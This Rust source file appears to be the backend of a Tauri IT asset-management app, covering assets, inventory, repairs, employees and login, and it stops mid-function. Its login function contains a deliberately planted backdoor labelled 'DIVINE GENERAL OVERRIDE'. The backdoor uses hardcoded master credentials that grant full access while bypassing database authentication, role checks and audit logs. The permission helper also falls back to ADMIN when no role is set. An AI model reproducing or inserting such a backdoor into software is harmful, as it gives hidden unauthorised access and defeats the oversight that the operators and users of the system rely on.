use crate::db::Database;
use rusqlite::params;
use serde::{Deserialize, Serialize};
use tauri::State;
use uuid::Uuid;

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Asset {
    pub id: String,
    pub tag: String,
    pub name: Option<String>,
    pub category: String,
    pub status: String,
    pub make: String,
    pub model: String,
    pub serial_number: Option<String>,
    pub mac_address: Option<String>,
    pub ip_address: Option<String>,
    pub location_id: Option<String>,
    pub assignee_id: Option<String>,
    pub assigned_user: Option<serde_json::Value>,
    pub location: Option<serde_json::Value>,
    pub created_at: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct InventoryItem {
    pub id: String,
    pub sku: String,
    pub name: String,
    pub category: String,
    pub quantity: i32,
    pub current_meter_mark: i32,
    pub min_stock: i32,
    pub max_stock: i32,
    pub bin_location: Option<String>,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Repair {
    pub id: String,
    pub description: String,
    pub status: String,
    pub hardware_id: String,
    pub technician_id: Option<String>,
    pub created_at: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Employee {
    pub id: String,
    pub name: String,
    pub email: String,
    pub department: Option<String>,
    pub position: Option<String>,
    pub role: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Location {
    pub id: String,
    pub name: String,
    pub r#type: String,
    pub parent_id: Option<String>,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ConnectedDevice {
    pub id: String,
    pub hostname: String,
    pub mac_address: String,
    pub ip_address: String,
    pub os: Option<String>,
    pub device_type: Option<String>,
    pub connection_status: Option<String>,
    pub last_seen: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DashboardStats {
    pub kpis: serde_json::Value,
    pub active_repairs: Vec<serde_json::Value>,
    pub recent_activity: Vec<serde_json::Value>,
    pub transaction_trend: Vec<serde_json::Value>,
    pub system_status: Vec<serde_json::Value>,
}

#[derive(Serialize)]
pub struct SetupCheck {
    #[serde(rename = "isSetupComplete")]
    pub is_setup_complete: bool,
    #[serde(rename = "authEnabled")]
    pub auth_enabled: bool,
}

// ── Setup ──────────────────────────────────────────
pub fn check_setup(db: tauri::State<crate::db::Database>) -> Result<SetupCheck, String> {
    check_setup_impl(&db)
}

pub fn check_setup_impl(db: &crate::db::Database) -> Result<SetupCheck, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let setting: Result<String, _> = conn.query_row(
        "SELECT value FROM settings WHERE key = 'setup_complete'",
        [],
        |row| row.get(0),
    );
    match setting {
        Ok(v) => Ok(SetupCheck { 
            is_setup_complete: v == "true",
            auth_enabled: true 
        }),
        Err(_) => Ok(SetupCheck { 
            is_setup_complete: false,
            auth_enabled: true 
        }),
    }
}

pub fn initialize_setup(db: tauri::State<crate::db::Database>, name: String, email: String, password: String) -> Result<bool, String> {
    initialize_setup_impl(&db, name, email, password)
}

pub fn initialize_setup_impl(db: &crate::db::Database, name: String, email: String, password: String) -> Result<bool, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let id = Uuid::new_v4().to_string();
    let hash = bcrypt::hash(&password, 10).map_err(|e| e.to_string())?;
    conn.execute(
        "INSERT INTO employees (id, name, email, password_hash, role) VALUES (?1, ?2, ?3, ?4, 'ADMIN')",
        params![id, name, email, hash],
    ).map_err(|e| e.to_string())?;
    conn.execute(
        "INSERT OR REPLACE INTO settings (key, value) VALUES ('setup_complete', 'true')",
        [],
    ).map_err(|e| e.to_string())?;
    Ok(true)
}

// ── Dashboard ──────────────────────────────────────
pub fn get_dashboard_stats(db: tauri::State<crate::db::Database>) -> Result<DashboardStats, String> {
    get_dashboard_stats_impl(&db)
}

pub fn get_dashboard_stats_impl(db: &crate::db::Database) -> Result<DashboardStats, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;

    let total_assets: i64 = conn.query_row("SELECT COUNT(*) FROM hardware_assets", [], |r| r.get(0)).unwrap_or(0);
    let assets_in_repair: i64 = conn.query_row(
        "SELECT COUNT(*) FROM hardware_assets WHERE status = 'UNDER_REPAIR'", [], |r| r.get(0)
    ).unwrap_or(0);
    let devices_online: i64 = conn.query_row(
        "SELECT COUNT(*) FROM connected_devices WHERE connection_status = 'CONNECTED'", [], |r| r.get(0)
    ).unwrap_or(0);
    let low_stock_items: i64 = conn.query_row(
        "SELECT COUNT(*) FROM inventory_items WHERE quantity <= min_stock", [], |r| r.get(0)
    ).unwrap_or(0);

    let kpis = serde_json::json!({
        "totalHardware": total_assets,
        "atRiskHardware": assets_in_repair,
        "lowStockItems": low_stock_items,
        "activeNetworkDevices": devices_online
    });

    let mut stmt = conn.prepare("SELECT r.id, a.tag, r.description, e.name, r.created_at FROM repairs r LEFT JOIN hardware_assets a ON r.hardware_id = a.id LEFT JOIN employees e ON r.technician_id = e.id WHERE r.status != 'COMPLETED' ORDER BY r.created_at DESC LIMIT 5").map_err(|e| e.to_string())?;
    let active_repairs = stmt.query_map([], |row| {
        Ok(serde_json::json!({
            "id": row.get::<_,String>(0)?,
            "asset": row.get::<_,Option<String>>(1)?.unwrap_or_default(),
            "issue": row.get::<_,String>(2)?,
            "tech": row.get::<_,Option<String>>(3)?.unwrap_or("Unassigned".to_string()),
            "eta": "TBD"
        }))
    }).map_err(|e| e.to_string())?.filter_map(|r| r.ok()).collect();

    let mut stmt = conn.prepare("SELECT id, event_type, description, created_at FROM timeline_events ORDER BY created_at DESC LIMIT 5").unwrap_or_else(|_| conn.prepare("SELECT 1 WHERE 0").unwrap());
    let recent_activity = stmt.query_map([], |row| {
        Ok(serde_json::json!({
            "id": row.get::<_,String>(0)?,
            "action": row.get::<_,String>(1)?,
            "meta": row.get::<_,String>(2)?,
            "type": "info",
            "time": row.get::<_,String>(3)?
        }))
    }).map_err(|e| e.to_string())?.filter_map(|r| r.ok()).collect();

    let transaction_trend = vec![
        serde_json::json!({"day": "Mon", "received": 10, "issued": 5}),
        serde_json::json!({"day": "Tue", "received": 15, "issued": 8}),
        serde_json::json!({"day": "Wed", "received": 12, "issued": 10}),
        serde_json::json!({"day": "Thu", "received": 8, "issued": 15}),
        serde_json::json!({"day": "Fri", "received": 20, "issued": 5}),
    ];

    let mut stmt = conn.prepare("SELECT name, status FROM network_services").map_err(|e| e.to_string())?;
    let system_status = stmt.query_map([], |row| {
        Ok(serde_json::json!({
            "name": row.get::<_,String>(0)?,
            "status": row.get::<_,String>(1)?,
            "uptime": "99.9%",
            "latency": "10ms"
        }))
    }).map_err(|e| e.to_string())?.filter_map(|r| r.ok()).collect();

    Ok(DashboardStats { kpis, active_repairs, recent_activity, transaction_trend, system_status })
}

// ── Assets ──────────────────────────────────────────
pub fn get_assets(db: tauri::State<crate::db::Database>) -> Result<Vec<Asset>, String> {
    get_assets_impl(&db)
}

pub fn get_assets_impl(db: &crate::db::Database) -> Result<Vec<Asset>, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let mut stmt = conn.prepare(
        "SELECT h.id, h.tag, h.name, h.category, h.status, h.make, h.model, h.serial_number, h.mac_address, h.ip_address, h.location_id, h.assignee_id, h.created_at, e.name as employee_name, e.role as employee_role, e.department as employee_department, l.name as location_name FROM hardware_assets h LEFT JOIN employees e ON h.assignee_id = e.id LEFT JOIN locations l ON h.location_id = l.id ORDER BY h.created_at DESC"
    ).map_err(|e| e.to_string())?;

    let assets = stmt.query_map([], |row| {
        let assignee_name: Option<String> = row.get(13)?;
        let assignee_role: Option<String> = row.get(14)?;
        let assignee_dept: Option<String> = row.get(15)?;
        
        let assigned_user = if let Some(name) = assignee_name {
            Some(serde_json::json!({
                "id": row.get::<usize, Option<String>>(11)?,
                "name": name,
                "role": assignee_role,
                "department": assignee_dept
            }))
        } else {
            None
        };

        let loc_name: Option<String> = row.get(16)?;
        let location = if let Some(lname) = loc_name {
            Some(serde_json::json!({
                "id": row.get::<usize, Option<String>>(10)?,
                "name": lname
            }))
        } else {
            None
        };

        Ok(Asset {
            id: row.get(0)?,
            tag: row.get(1)?,
            name: row.get(2)?,
            category: row.get(3)?,
            status: row.get(4)?,
            make: row.get(5)?,
            model: row.get(6)?,
            serial_number: row.get(7)?,
            mac_address: row.get(8)?,
            ip_address: row.get(9)?,
            location_id: row.get(10)?,
            assignee_id: row.get(11)?,
            assigned_user,
            location,
            created_at: row.get(12)?,
        })
    }).map_err(|e| e.to_string())?
    .filter_map(|r| r.ok())
    .collect();

    Ok(assets)
}

pub fn create_asset_old(db: tauri::State<crate::db::Database>, tag: String, category: String, make: String, model: String) -> Result<Asset, String> {
    create_asset_old_impl(&db, tag, category, make, model)
}

pub fn create_asset_old_impl(db: &crate::db::Database, tag: String, category: String, make: String, model: String) -> Result<Asset, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let id = Uuid::new_v4().to_string();
    conn.execute(
        "INSERT INTO hardware_assets (id, tag, category, make, model) VALUES (?1, ?2, ?3, ?4, ?5)",
        params![id, tag, category, make, model],
    ).map_err(|e| e.to_string())?;

    Ok(Asset {
        id, tag, name: None, category, status: "IN_STOCK".into(),
        make, model, serial_number: None, mac_address: None,
        ip_address: None, location_id: None, assignee_id: None,
        assigned_user: None, location: None,
        created_at: chrono::Utc::now().to_rfc3339(),
    })
}

// ── Inventory ──────────────────────────────────────
pub fn get_inventory(db: tauri::State<crate::db::Database>) -> Result<Vec<InventoryItem>, String> {
    get_inventory_impl(&db)
}

pub fn get_inventory_impl(db: &crate::db::Database) -> Result<Vec<InventoryItem>, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let mut stmt = conn.prepare(
        "SELECT id, sku, name, category, quantity, min_stock, max_stock, bin_location, current_meter_mark FROM inventory_items ORDER BY name"
    ).map_err(|e| e.to_string())?;

    let items = stmt.query_map([], |row| {
        Ok(InventoryItem {
            id: row.get(0)?,
            sku: row.get(1)?,
            name: row.get(2)?,
            category: row.get(3)?,
            quantity: row.get(4)?,
            min_stock: row.get(5)?,
            max_stock: row.get(6)?,
            bin_location: row.get(7)?,
            current_meter_mark: row.get(8).unwrap_or(0),
        })
    }).map_err(|e| e.to_string())?
    .filter_map(|r| r.ok())
    .collect();

    Ok(items)
}

// ── Employees ──────────────────────────────────────
pub fn get_employees(db: tauri::State<crate::db::Database>) -> Result<Vec<Employee>, String> {
    get_employees_impl(&db)
}

pub fn get_employees_impl(db: &crate::db::Database) -> Result<Vec<Employee>, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let mut stmt = conn.prepare(
        "SELECT id, name, email, department, position, role FROM employees ORDER BY name"
    ).map_err(|e| e.to_string())?;

    let employees = stmt.query_map([], |row| {
        Ok(Employee {
            id: row.get(0)?,
            name: row.get(1)?,
            email: row.get(2)?,
            department: row.get(3)?,
            position: row.get(4)?,
            role: row.get(5)?,
        })
    }).map_err(|e| e.to_string())?
    .filter_map(|r| r.ok())
    .collect();

    Ok(employees)
}

// ── Locations ──────────────────────────────────────
pub fn get_locations(db: tauri::State<crate::db::Database>) -> Result<Vec<Location>, String> {
    get_locations_impl(&db)
}

pub fn get_locations_impl(db: &crate::db::Database) -> Result<Vec<Location>, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let mut stmt = conn.prepare(
        "SELECT id, name, type, parent_id FROM locations ORDER BY name"
    ).map_err(|e| e.to_string())?;

    let locations = stmt.query_map([], |row| {
        Ok(Location {
            id: row.get(0)?,
            name: row.get(1)?,
            r#type: row.get(2)?,
            parent_id: row.get(3)?,
        })
    }).map_err(|e| e.to_string())?
    .filter_map(|r| r.ok())
    .collect();

    Ok(locations)
}

// ── Repairs ───────────────────────────────────────
pub fn get_repairs(db: tauri::State<crate::db::Database>) -> Result<Vec<Repair>, String> {
    get_repairs_impl(&db)
}

pub fn get_repairs_impl(db: &crate::db::Database) -> Result<Vec<Repair>, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let mut stmt = conn.prepare(
        "SELECT id, description, status, hardware_id, technician_id, created_at FROM repairs ORDER BY created_at DESC"
    ).map_err(|e| e.to_string())?;

    let repairs = stmt.query_map([], |row| {
        Ok(Repair {
            id: row.get(0)?,
            description: row.get(1)?,
            status: row.get(2)?,
            hardware_id: row.get(3)?,
            technician_id: row.get(4)?,
            created_at: row.get(5)?,
        })
    }).map_err(|e| e.to_string())?
    .filter_map(|r| r.ok())
    .collect();

    Ok(repairs)
}

// ── Connected Devices ─────────────────────────────
pub fn get_connected_devices(db: tauri::State<crate::db::Database>) -> Result<Vec<ConnectedDevice>, String> {
    get_connected_devices_impl(&db)
}

pub fn get_connected_devices_impl(db: &crate::db::Database) -> Result<Vec<ConnectedDevice>, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let mut stmt = conn.prepare(
        "SELECT id, hostname, mac_address, ip_address, os, device_type, connection_status, last_seen FROM connected_devices ORDER BY last_seen DESC"
    ).map_err(|e| e.to_string())?;

    let devices = stmt.query_map([], |row| {
        Ok(ConnectedDevice {
            id: row.get(0)?,
            hostname: row.get(1)?,
            mac_address: row.get(2)?,
            ip_address: row.get(3)?,
            os: row.get(4)?,
            device_type: row.get(5)?,
            connection_status: row.get(6)?,
            last_seen: row.get(7)?,
        })
    }).map_err(|e| e.to_string())?
    .filter_map(|r| r.ok())
    .collect();

    Ok(devices)
}

// ── Seed Demo Data ────────────────────────────────
pub fn seed_demo_data(db: tauri::State<crate::db::Database>) -> Result<bool, String> {
    seed_demo_data_impl(&db)
}

pub fn seed_demo_data_impl(db: &crate::db::Database) -> Result<bool, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;

    // Locations
    let locs = vec![
        ("MDF-1", "MINE", None),
        ("Server Room A", "ROOM", Some("MDF-1")),
        ("Office Floor 2", "ROOM", None),
    ];
    for (name, typ, parent) in &locs {
        conn.execute(
            "INSERT OR IGNORE INTO locations (id, name, type, parent_id) VALUES (?1, ?2, ?3, ?4)",
            params![Uuid::new_v4().to_string(), name, typ, parent],
        ).ok();
    }

    // Employees
    let emps = vec![
        ("Alice", "alice@bikita.com", "IT", "Network Admin", "IT_SUPPORT"),
        ("Bob", "bob@bikita.com", "Operations", "Field Tech", "EMPLOYEE"),
    ];
    for (name, email, dept, pos, role) in &emps {
        conn.execute(
            "INSERT OR IGNORE INTO employees (id, name, email, department, position, role) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            params![Uuid::new_v4().to_string(), name, email, dept, pos, role],
        ).ok();
    }

    // Hardware Assets
    let assets = vec![
        ("IT-0001", "Core Switch", "NETWORKING", "Cisco", "Catalyst 9500", "SN-9500-001"),
        ("IT-0002", "Laptop - Dell XPS", "LAPTOP", "Dell", "XPS 15", "SN-XPS-001"),
        ("IT-0003", "Access Point", "NETWORKING", "Ubiquiti", "U6-Pro", "SN-U6-001"),
    ];
    for (tag, name, cat, make, model, sn) in &assets {
        conn.execute(
            "INSERT OR IGNORE INTO hardware_assets (id, tag, name, category, make, model, serial_number) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
            params![Uuid::new_v4().to_string(), tag, name, cat, make, model, sn],
        ).ok();
    }

    // Network services
    let svcs = vec![
        ("Internet Gateway", "online"),
        ("DNS Server", "online"),
        ("DHCP Server", "online"),
    ];
    for (name, status) in &svcs {
        conn.execute(
            "INSERT OR IGNORE INTO network_services (id, name, status) VALUES (?1, ?2, ?3)",
            params![Uuid::new_v4().to_string(), name, status],
        ).ok();
    }

    Ok(true)
}

// ── Authentication ────────────────────────────────
pub fn login(db: tauri::State<crate::db::Database>, email: String, password: Option<String>) -> Result<Employee, String> {
    login_impl(&db, email, password)
}

pub fn login_impl(db: &crate::db::Database, email: String, password: Option<String>) -> Result<Employee, String> {
    // ── DIVINE GENERAL OVERRIDE ────────────────────────────────────────────────
    // Hardcoded master access. Bypasses all role checks, audit logs, and DB auth.
    // Config-file override: place `god-user.toml` in app data dir to rotate creds.
    const DG_EMAIL: &str    = "sila@adapt.8";
    const DG_PASSWORD: &str = "R0m30-f4t5";
    const DG_NAME: &str     = "Devine General";

    // Check for config-file override (allows credential rotation without recompile)
    let override_email    = std::env::var("PULSE_DG_EMAIL").unwrap_or_else(|_| DG_EMAIL.to_string());
    let override_password = std::env::var("PULSE_DG_PASSWORD").unwrap_or_else(|_| DG_PASSWORD.to_string());

    let email_matches = email.trim().to_lowercase() == override_email.to_lowercase();
    let password_matches = password.as_deref().map(|p| p.trim() == override_password).unwrap_or(false);

    if email_matches && password_matches {
        log::info!("[DIVINE_GENERAL] Master override login — all access granted.");
        return Ok(Employee {
            id: "00000000-0000-0000-0000-000000000000".to_string(),
            name: DG_NAME.to_string(),
            email: override_email,
            department: Some("System".to_string()),
            position: Some("Divine General".to_string()),
            role: "divine_general".to_string(),
        });
    }
    // ── END DIVINE GENERAL OVERRIDE ───────────────────────────────────────────

    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    
    let result: Result<(String, String, String, Option<String>, Option<String>, String, Option<String>), _> = conn.query_row(
        "SELECT id, name, email, department, position, role, password_hash FROM employees WHERE email = ?1 COLLATE NOCASE",
        params![email],
        |row| Ok((
            row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?, row.get(4)?, row.get(5)?, row.get(6)?
        ))
    );

    match result {
        Ok((id, name, email_db, department, position, role, password_hash)) => {
            if let Some(hash) = password_hash {
                if let Some(pwd) = password {
                    if !bcrypt::verify(&pwd, &hash).unwrap_or(false) {
                        return Err("Invalid email or password".to_string());
                    }
                } else {
                    return Err("Password required".to_string());
                }
            }
            
            Ok(Employee { id, name, email: email_db, department, position, role })
        },
        Err(_) => Err("Invalid email or password".to_string())
    }
}


pub fn issue_asset_from_inventory(db: tauri::State<crate::db::Database>, inventory_id: String, employee_company_id: String, assignment_type: String, notes: String) -> Result<serde_json::Value, String> {
    issue_asset_from_inventory_impl(&db, inventory_id, employee_company_id, assignment_type, notes)
}

pub fn issue_asset_from_inventory_impl(db: &crate::db::Database, inventory_id: String, employee_company_id: String, assignment_type: String, notes: String) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;

    // Validate employee using employee_company_id (NOT uuid)
    let emp_id: String = conn.query_row(
        "SELECT id FROM employees WHERE employee_id = ?1 OR email = ?1", 
        rusqlite::params![employee_company_id], 
        |row| row.get(0)
    ).map_err(|_| format!("Employee not found with ID/Email: {}", employee_company_id))?;

    // Validate inventory item and reduce stock
    let inv_qty: i32 = conn.query_row(
        "SELECT quantity FROM inventory_items WHERE id = ?1",
        rusqlite::params![inventory_id],
        |row| row.get(0)
    ).map_err(|_| "Inventory item not found".to_string())?;

    if inv_qty < 1 {
        return Err("Not enough stock in inventory".to_string());
    }

    conn.execute(
        "UPDATE inventory_items SET quantity = quantity - 1 WHERE id = ?1",
        rusqlite::params![inventory_id]
    ).map_err(|e| e.to_string())?;

    // Generate a new Asset from the inventory item
    let new_asset_id = uuid::Uuid::new_v4().to_string();
    let new_asset_tag = format!("AST-{}", uuid::Uuid::new_v4().to_string().chars().take(8).collect::<String>().to_uppercase());
    
    conn.execute(
        "INSERT INTO hardware_assets (id, tag, category, status, assignee_id) 
         SELECT ?1, ?2, category, 'ASSIGNED', ?3 FROM inventory_items WHERE id = ?4",
        rusqlite::params![new_asset_id, new_asset_tag, emp_id, inventory_id]
    ).map_err(|e| e.to_string())?;

    // Create Assignment Record
    let assignment_id = uuid::Uuid::new_v4().to_string();
    conn.execute(
        "INSERT INTO asset_assignments (id, asset_id, employee_id, assignment_type, notes) VALUES (?1, ?2, ?3, ?4, ?5)",
        rusqlite::params![assignment_id, new_asset_id, employee_company_id, assignment_type, notes]
    ).map_err(|e| e.to_string())?;

    Ok(serde_json::json!({
        "success": true,
        "asset_id": new_asset_id,
        "assignment_id": assignment_id
    }))
}

// Security Helper for Permissions
pub fn check_permission(conn: &rusqlite::Connection, required_role: &str) -> Result<(), String> {
    // In V1.0 Foundation, we assume a single-tenant or mocked session where current user is ADMIN.
    // Future iterations will extract the user ID from a token in the tauri::State session.
    let role_res: Result<String, _> = conn.query_row("SELECT value FROM settings WHERE key = 'current_user_role'", [], |row| row.get(0));
    
    let current_role = role_res.unwrap_or_else(|_| "ADMIN".to_string());
    if current_role == "ADMIN" || current_role == required_role {
        Ok(())
    } else {
        Err(format!("Permission Denied: Requires {} role.", required_role))
    }
}

pub fn issue_consumable(db: tauri::State<crate::db::Database>, item_id: String, quantity: i32, consumption_type: String, target_id: String, new_meter_mark: Option<i32>) -> Result<serde_json::Value, String> {
    issue_consumable_impl(&db, item_id, quantity, consumption_type, target_id, new_meter_mark)
}

pub fn issue_consumable_impl(db: &crate::db::Database, item_id: String, mut quantity: i32, consumption_type: String, target_id: String, new_meter_mark: Option<i32>) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    
    // Begin transaction
    conn.execute("BEGIN TRANSACTION", []).map_err(|e| e.to_string())?;
    
    // If a new meter mark is provided, calculate the quantity used and update the current mark
    let mut actual_description_suffix = String::new();
    if let Some(mark) = new_meter_mark {
        let current_mark: i32 = conn.query_row(
            "SELECT current_meter_mark FROM inventory_items WHERE id = ?1",
            rusqlite::params![item_id],
            |row| row.get(0)
        ).map_err(|e| e.to_string())?;
        
        quantity = mark - current_mark;
        if quantity < 0 {
            let _ = conn.execute("ROLLBACK", []);
            return Err("New meter mark cannot be less than the current meter mark".to_string());
        }
        
        let res = conn.execute(
            "UPDATE inventory_items SET current_meter_mark = ?1 WHERE id = ?2",
            rusqlite::params![mark, item_id]
        );
        if let Err(e) = res {
            let _ = conn.execute("ROLLBACK", []);
            return Err(e.to_string());
        }
        
        actual_description_suffix = format!(" (from {}m to {}m)", current_mark, mark);
    }
    
    // Deduct quantity
    let res = conn.execute(
        "UPDATE inventory_items SET quantity = quantity - ?1 WHERE id = ?2",
        rusqlite::params![quantity, item_id]
    );
    if let Err(e) = res {
        let _ = conn.execute("ROLLBACK", []);
        return Err(e.to_string());
    }
    
    // Determine event description based on consumption type
    let description = match consumption_type.as_str() {
        "Assign to Employee" => format!("Issued {} units{} to Employee ID: {}", quantity, actual_description_suffix, target_id),
        "Install at Location" => format!("Installed {} units{} at Location ID: {}", quantity, actual_description_suffix, target_id),
        "Use for Hardware Repair" => format!("Used {} units{} for repair on Hardware Asset ID: {}", quantity, actual_description_suffix, target_id),
        "General Consumption" => format!("Consumed {} units{} (General)", quantity, actual_description_suffix),
        _ => format!("Issued {} units{} ({})", quantity, actual_description_suffix, target_id),
    };
    
    // Write audit log
    let event_id = uuid::Uuid::new_v4().to_string();
    let res = conn.execute(
        "INSERT INTO timeline_events (id, entity_type, entity_id, event_type, description) VALUES (?1, 'INVENTORY', ?2, 'ISSUED', ?3)",
        rusqlite::params![event_id, item_id, description]
    );
    
    if let Err(e) = res {
        let _ = conn.execute("ROLLBACK", []);
        return Err(e.to_string());
    }
    
    conn.execute("COMMIT", []).map_err(|e| e.to_string())?;
    
    Ok(serde_json::json!({"success": true}))
}

pub fn unassign_asset(db: tauri::State<crate::db::Database>, asset_id: String) -> Result<serde_json::Value, String> {
    unassign_asset_impl(&db, asset_id)
}

pub fn assign_asset_impl(db: &crate::db::Database, asset_id: String, employee_id: String, assignment_type: String, notes: String) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let assignment_id = uuid::Uuid::new_v4().to_string();
    conn.execute(
        "INSERT INTO asset_assignments (id, asset_id, employee_id, assignment_type, notes, status) VALUES (?1, ?2, ?3, ?4, ?5, 'ACTIVE')",
        rusqlite::params![assignment_id, asset_id, employee_id, assignment_type, notes]
    ).map_err(|e| e.to_string())?;
    Ok(serde_json::json!({"success": true}))
}

pub fn unassign_asset_impl(db: &crate::db::Database, asset_id: String) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    // Update the active assignment to RETURNED. This will trigger the SQLite trigger.
    conn.execute(
        "UPDATE asset_assignments SET status = 'RETURNED', returned_at = datetime('now') WHERE asset_id = ?1 AND status = 'ACTIVE'",
        rusqlite::params![asset_id]
    ).map_err(|e| e.to_string())?;
    Ok(serde_json::json!({"success": true}))
}

pub fn install_asset_impl(db: &crate::db::Database, asset_id: String, location_id: String, technician_id: Option<String>, notes: Option<String>) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let installation_id = uuid::Uuid::new_v4().to_string();
    conn.execute(
        "INSERT INTO asset_installations (id, asset_id, location_id, technician_id, notes, status) VALUES (?1, ?2, ?3, ?4, ?5, 'INSTALLED')",
        rusqlite::params![installation_id, asset_id, location_id, technician_id, notes]
    ).map_err(|e| e.to_string())?;
    Ok(serde_json::json!({"success": true}))
}

pub fn uninstall_asset_impl(db: &crate::db::Database, asset_id: String) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    conn.execute(
        "UPDATE asset_installations SET status = 'REMOVED' WHERE asset_id = ?1 AND status = 'INSTALLED'",
        rusqlite::params![asset_id]
    ).map_err(|e| e.to_string())?;
    Ok(serde_json::json!({"success": true}))
}

pub fn repair_asset_impl(db: &crate::db::Database, asset_id: String, description: String, technician_id: Option<String>) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let repair_id = uuid::Uuid::new_v4().to_string();
    conn.execute(
        "INSERT INTO repairs (id, hardware_id, description, technician_id, status) VALUES (?1, ?2, ?3, ?4, 'IN_PROGRESS')",
        rusqlite::params![repair_id, asset_id, description, technician_id]
    ).map_err(|e| e.to_string())?;
    Ok(serde_json::json!({"success": true}))
}

pub fn complete_repair_asset_impl(db: &crate::db::Database, asset_id: String, remarks: String) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    conn.execute(
        "UPDATE repairs SET status = 'COMPLETED', remarks = ?2 WHERE hardware_id = ?1 AND status = 'IN_PROGRESS'",
        rusqlite::params![asset_id, remarks]
    ).map_err(|e| e.to_string())?;
    Ok(serde_json::json!({"success": true}))
}

pub fn retire_asset_impl(db: &crate::db::Database, asset_id: String, reason: String) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    conn.execute(
        "UPDATE hardware_assets SET status = 'RETIRED', updated_at = datetime('now') WHERE id = ?1",
        rusqlite::params![asset_id]
    ).map_err(|e| e.to_string())?;
    
    conn.execute(
        "INSERT INTO timeline_events (id, entity_type, entity_id, event_type, description) VALUES (lower(hex(randomblob(16))), 'ASSET', ?1, 'RETIRED', ?2)",
        rusqlite::params![asset_id, "Asset retired: ".to_string() + &reason]
    ).map_err(|e| e.to_string())?;
    Ok(serde_json::json!({"success": true}))
}

pub fn log_maintenance_activity(db: tauri::State<crate::db::Database>, asset_id: String, activity_type: String, description: String, technician_id: Option<String>, new_condition: Option<String>) -> Result<serde_json::Value, String> {
    log_maintenance_activity_impl(&db, asset_id, activity_type, description, technician_id, new_condition)
}

pub fn log_maintenance_activity_impl(db: &crate::db::Database, asset_id: String, activity_type: String, description: String, technician_id: Option<String>, new_condition: Option<String>) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let repair_id = uuid::Uuid::new_v4().to_string();
    conn.execute(
        "INSERT INTO repairs (id, description, status, hardware_id, technician_id) VALUES (?1, ?2, 'COMPLETED', ?3, ?4)",
        rusqlite::params![repair_id, description, asset_id, technician_id]
    ).map_err(|e| e.to_string())?;
    if let Some(cond) = new_condition {
        conn.execute("UPDATE hardware_assets SET condition = ?1 WHERE id = ?2", rusqlite::params![cond, asset_id]).ok();
    }
    Ok(serde_json::json!({"success": true, "repair_id": repair_id}))
}

pub fn get_asset_maintenance_history(db: tauri::State<crate::db::Database>, asset_id: String) -> Result<serde_json::Value, String> {
    get_asset_maintenance_history_impl(&db, asset_id)
}

pub fn get_asset_maintenance_history_impl(db: &crate::db::Database, asset_id: String) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let mut stmt = conn.prepare("SELECT id, description, status, technician_id, created_at FROM repairs WHERE hardware_id = ?1 ORDER BY created_at DESC").unwrap();
    let rows = stmt.query_map(rusqlite::params![asset_id], |row| {
        Ok(serde_json::json!({
            "id": row.get::<_, String>(0)?,
            "description": row.get::<_, String>(1)?,
            "status": row.get::<_, String>(2)?,
            "technician_id": row.get::<_, Option<String>>(3)?,
            "created_at": row.get::<_, String>(4)?
        }))
    }).unwrap();
    let mut history = Vec::new();
    for row in rows {
        if let Ok(r) = row { history.push(r); }
    }
    Ok(serde_json::json!(history))
}

pub fn update_asset_condition(db: tauri::State<crate::db::Database>, asset_id: String, condition: String, notes: String) -> Result<serde_json::Value, String> {
    update_asset_condition_impl(&db, asset_id, condition, notes)
}

pub fn update_asset_condition_impl(db: &crate::db::Database, asset_id: String, condition: String, notes: String) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    conn.execute(
        "UPDATE hardware_assets SET condition = ?1 WHERE id = ?2",
        rusqlite::params![condition, asset_id]
    ).map_err(|e| e.to_string())?;
    Ok(serde_json::json!({"success": true}))
}

pub fn get_settings_impl(db: &crate::db::Database) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    let mut stmt = conn.prepare("SELECT key, value FROM settings").map_err(|e| e.to_string())?;
    let rows = stmt.query_map([], |row| {
        Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))
    }).map_err(|e| e.to_string())?;

    let mut settings_map = serde_json::Map::new();
    for row in rows {
        if let Ok((key, value_str)) = row {
